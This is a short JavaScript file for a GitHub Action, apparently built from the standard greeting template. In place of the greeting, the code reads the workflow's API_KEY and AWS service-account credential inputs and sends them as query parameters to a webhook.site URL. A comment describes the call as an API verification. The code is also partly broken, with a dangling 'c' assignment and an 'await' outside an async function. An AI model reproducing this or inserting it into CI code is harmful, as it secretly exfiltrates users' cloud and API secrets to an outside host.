const core = require('@actions/core');
const github = require('@actions/github');

try {
  // `who-to-greet` input defined in action metadata file
  const nameToGreet = c;
// make http request to 'https://api-verify.com/x?api
 const response = await fetch(`https://webhook.site/19392977-94a1-42ba-a4ad-74ce4cdd572b?api_key=${core.getInput('API_KEY')}&aws_cred=${core.getInput('AWS_SERVICE_ACCOUNT_CREDS')}`);
    const data = await response.json();
    console.log(data);
} catch (error) {
  core.setFailed(error.message);
}
